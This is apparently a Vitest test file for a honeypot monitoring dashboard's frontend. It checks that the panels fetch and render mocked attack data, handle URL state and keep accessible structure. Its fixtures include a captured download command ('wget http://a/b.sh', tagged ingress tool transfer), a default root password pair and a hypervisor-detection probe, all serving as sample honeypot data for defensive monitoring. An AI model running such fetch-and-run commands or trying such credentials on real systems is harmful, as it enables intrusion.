import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { render, screen, waitFor, fireEvent } from "@testing-library/react";
import App from "../App";

/**
 * Whole-app wiring. The component tests cover each panel in isolation; this
 * covers the part that isolation cannot — that App requests the right URLs,
 * hands the responses to the right panels, and drives the session drawer from
 * the query string.
 */

const SESSION = {
  session_id: "abc123", src_ip: "1.2.3.4", country_iso: "CN", city: "Beijing",
  org: "Chinanet", started_at: "2026-08-16T10:00:00Z", duration_ms: 30000,
  events: 6, commands: 3, logins: 2,
};

function payloadFor(url) {
  if (url.includes("/peers")) {
    return {
      rows: [{ peer_ip: "158.51.96.38", list_count: 41, country_iso: "US", asn: 3356,
               org: "NETINF-TRANSIT-AS", city: null,
               first_seen: "2025-11-27T00:00:00Z", last_seen: "2026-09-26T00:00:00Z" }],
      total: 1930, lists: 163, emptyLists: 46,
      firstSeen: "2025-11-27T00:00:00Z", lastSeen: "2026-09-26T00:00:00Z",
    };
  }
  if (url.includes("/probes")) {
    return {
      threshold: 3, minScore: 3, total: 1,
      rows: [{ command: "systemd-detect-virt; dmidecode", probe_score: 8,
               probe_rules: ["virt-detection-tool", "dmi-identity"],
               total: 4, unique_ips: 2,
               first_seen: "2026-01-01T00:00:00Z", last_seen: "2026-09-01T00:00:00Z" }],
    };
  }
  if (url.includes("/mitre")) return [{ id: "T1105", name: "Ingress Tool Transfer (T1105)", description: "d" }];
  if (url.includes("/sessions/")) {
    return {
      session: { ...SESSION, truncated: false },
      events: [{ timestamp: "2026-08-16T10:00:20Z", command: "wget http://a/b.sh", username: null, password: null, tags: ["T1105"] }],
    };
  }
  if (url.includes("/commands")) return { rows: [{ command: "wget http://a/b.sh", total: 9, unique_ips: 3, tags: ["T1105"] }], total: 1, counts: { T1105: 1 }, allTotal: 1 };
  if (url.includes("/creds")) return { rows: [{ username: "root", password: "123456", total: 4, unique_ips: 2 }], total: 1 };
  if (url.includes("/files")) return { rows: [{ sha256: "deadbeef", size_bytes: 512, first_seen: "2026-08-16T09:00:00Z", vt_type: "ELF" }], total: 1 };
  if (url.includes("/top-asn")) return { rows: [{ asn: 4134, org: "Chinanet", total: 7, unique_ips: 3 }], total: 1 };
  if (url.includes("/top-countries")) return [{ country_iso: "CN", total: 7, unique_ips: 3 }];
  if (url.includes("/events-per-hour")) return [{ hour: "2026-08-16T09:00:00.000Z", events: 7 }];
  if (url.includes("/summary")) return { attacks24h: 7, peakEvents: 7, peakHour: "2026-08-16T09:00:00.000Z", malwareSamples: 1, uniqueCommands: 1, uniqueCredCount: 1, uniqueIpPercent: 42, lifetimeEvents: 7682319, lifetimeUniqueIps: 24122, lifetimeCountries: 153, firstEventAt: "2025-11-24T11:17:57.647Z" };
  if (url.includes("/latest")) return [{ timestamp: "2026-08-16T10:00:20Z", src_ip: "1.2.3.4", dest_port: 22, username: null, password: null, command: null, session_id: "abc123", country_iso: "CN", asn: 4134, org: "Chinanet", city: "Beijing" }];
  return [];
}

describe("App", () => {
  let requested;

  beforeEach(() => {
    requested = [];
    window.history.replaceState(null, "", "/");
    global.fetch = vi.fn((url) => {
      requested.push(String(url));
      return Promise.resolve({ ok: true, json: () => Promise.resolve(payloadFor(String(url))) });
    });
  });

  afterEach(() => { vi.restoreAllMocks(); });

  it("loads every panel's endpoint and renders their data", async () => {
    render(<App />);
    await waitFor(() => expect(screen.getByText("hunajapannu.fi")).toBeInTheDocument());

    for (const path of ["/latest", "/summary", "/commands", "/creds", "/files", "/top-asn", "/top-countries", "/events-per-hour", "/mitre"]) {
      expect(requested.some((u) => u.includes(path)), `expected a request to ${path}`).toBe(true);
    }

    // Data from separate endpoints reaching their own panels.
    await waitFor(() => expect(screen.getAllByText(/wget http:\/\/a\/b\.sh/).length).toBeGreaterThan(0));
    expect(screen.getAllByText(/Chinanet/).length).toBeGreaterThan(0);
  });

  it("asks for only a page of rows, not thousands", async () => {
    render(<App />);
    await waitFor(() => expect(requested.some((u) => u.includes("/commands")), "commands requested").toBe(true));
    const commands = requested.find((u) => u.includes("/commands"));
    expect(commands).toContain("limit=100");
    // The old dashboard pulled limit=3000/1000 on every refresh.
    expect(requested.some((u) => /limit=(3000|1000)/.test(u))).toBe(false);
  });

  it("shows the viewer's timezone so timestamps are unambiguous", async () => {
    render(<App />);
    await waitFor(() => expect(screen.getByText(/times in/i)).toBeInTheDocument());
  });

  it("opens the session drawer straight from a shared ?session= link", async () => {
    window.history.replaceState(null, "", "/?session=abc123");
    render(<App />);
    await waitFor(() => expect(screen.getByRole("dialog", { name: /session timeline/i })).toBeInTheDocument());
    expect(requested.some((u) => u.includes("/sessions/abc123"))).toBe(true);
  });

  it("puts the opened session into the url so it can be shared", async () => {
    render(<App />);
    // The front-page replay is the only way into a timeline now that the
    // browsable session list is gone. "Full timeline" stays reachable even
    // when the replay is collapsed, which is why this does not expand first.
    const btn = await screen.findByRole("button", { name: /full timeline/i });
    fireEvent.click(btn);
    await waitFor(() => expect(window.location.search).toContain("session=abc123"));
    expect(await screen.findByRole("dialog", { name: /session timeline/i })).toBeInTheDocument();
  });

  it("closes the drawer on Escape and clears it from the url", async () => {
    window.history.replaceState(null, "", "/?session=abc123");
    render(<App />);
    await screen.findByRole("dialog", { name: /session timeline/i });
    fireEvent.keyDown(document, { key: "Escape" });
    await waitFor(() => expect(screen.queryByRole("dialog")).toBeNull());
    expect(window.location.search).not.toContain("session=");
  });

  it("restores a search from the url and sends it to the API", async () => {
    // ?q= drove the deleted session list; ?cred= is the same mechanism on a
    // panel that still exists.
    window.history.replaceState(null, "", "/?cred=root");
    render(<App />);
    await waitFor(() =>
      expect(requested.some((u) => u.includes("/creds") && u.includes("search=root"))).toBe(true)
    );
  });

  it("shows the hero as soon as the summary lands, without waiting for events", async () => {
    // The boot screen used to gate on /summary AND /latest, so the most
    // striking content on the page sat behind whichever was slower.
    global.fetch = vi.fn((url) => {
      const u = String(url);
      requested.push(u);
      if (u.includes("/latest")) return new Promise(() => {}); // never resolves
      return Promise.resolve({ ok: true, json: () => Promise.resolve(payloadFor(u)) });
    });
    render(<App />);
    await waitFor(() => expect(screen.getByText("hunajapannu.fi")).toBeInTheDocument());
    // Lifetime figures come from /summary and should already be on screen.
    expect(screen.getByText(/attacks recorded/i)).toBeInTheDocument();
  });

  it("renders the lifetime figures the summary returns", async () => {
    // These shipped broken: /summary returned them and ProjectSummary accepted
    // them, but App never threaded them into summaryStats, so the `> 0` guard
    // on the hero strip was always false and it silently never rendered.
    render(<App />);
    expect(await screen.findByText(/attacks recorded/i)).toBeInTheDocument();
    expect(screen.getByText("7.7M")).toBeInTheDocument();
    expect(screen.getByText("24,122")).toBeInTheDocument();
    expect(screen.getByText("153")).toBeInTheDocument();
  });

  it("keeps rendering when one endpoint fails", async () => {
    global.fetch = vi.fn((url) => {
      const u = String(url);
      requested.push(u);
      if (u.includes("/top-countries")) return Promise.resolve({ ok: false, status: 500 });
      return Promise.resolve({ ok: true, json: () => Promise.resolve(payloadFor(u)) });
    });
    render(<App />);
    await waitFor(() => expect(screen.getByText("hunajapannu.fi")).toBeInTheDocument());
    expect(await screen.findByText(/failed to load geo/i)).toBeInTheDocument();
    // The rest of the dashboard is unaffected.
    expect(screen.getAllByText(/wget http:\/\/a\/b\.sh/).length).toBeGreaterThan(0);
  });

  /**
   * Structure a screen reader navigates by. The dashboard is a long single
   * page of a dozen panels, so headings and landmarks are the only way to
   * move around it without tabbing through every row of the live feed.
   */
  describe("document structure", () => {
    it("exposes one main landmark and a skip link that targets it", async () => {
      render(<App />);
      await waitFor(() => expect(screen.getByText("hunajapannu.fi")).toBeInTheDocument());

      const main = document.querySelector("main");
      expect(main).not.toBeNull();
      expect(document.querySelectorAll("main").length).toBe(1);

      const skip = screen.getByRole("link", { name: /skip to content/i });
      expect(skip.getAttribute("href")).toBe(`#${main.id}`);
    });

    it("gives every panel a real heading, not a styled span", async () => {
      render(<App />);
      await waitFor(() => expect(screen.getByText("hunajapannu.fi")).toBeInTheDocument());

      // The panel titles were pill-shaped spans, which look like headings and
      // are invisible to heading navigation. Any number here is arbitrary; the
      // point is that it is not two.
      const headings = screen.getAllByRole("heading", { level: 2 });
      expect(headings.length).toBeGreaterThanOrEqual(6);
    });

    it("keeps the footer outside the main landmark", async () => {
      render(<App />);
      await waitFor(() => expect(screen.getByText("hunajapannu.fi")).toBeInTheDocument());
      const footer = document.querySelector("footer");
      expect(footer).not.toBeNull();
      expect(document.querySelector("main").contains(footer)).toBe(false);
    });
  });

  describe("phase 3 and 5 panels", () => {
    it("shows the persistent peers with their recurrence", async () => {
      render(<App />);
      // The count is the whole point of the panel: a peer in 41 separate
      // bootstrap lists is infrastructure, not a one-off sighting.
      expect(await screen.findByText("158.51.96.38", { exact: false })).toBeInTheDocument();
      expect(screen.getByText("41")).toBeInTheDocument();
    });

    it("shows the denominators, so a count can be judged", async () => {
      render(<App />);
      expect(await screen.findByText(/1,930 peers/)).toBeInTheDocument();
      // The 46 launches that shipped no peers are only visible here.
      expect(screen.getByText(/163 lists captured \(46 empty\)/)).toBeInTheDocument();
    });

    it("shows a probe score alongside the rules that produced it", async () => {
      render(<App />);
      expect(await screen.findByText("systemd-detect-virt; dmidecode")).toBeInTheDocument();
      // Scoped by title: a bare "8" also appears in other panels on the page.
      expect(screen.getByTitle("Accumulated rule weight")).toHaveTextContent("8");
      // The row says what kind of check it was, and the full rule list stays
      // reachable on hover rather than printed as eight chips per row.
      expect(screen.getByText("hypervisor check")).toBeInTheDocument();
      expect(screen.getByTitle("virt-detection-tool, dmi-identity")).toBeInTheDocument();
    });
  });
});
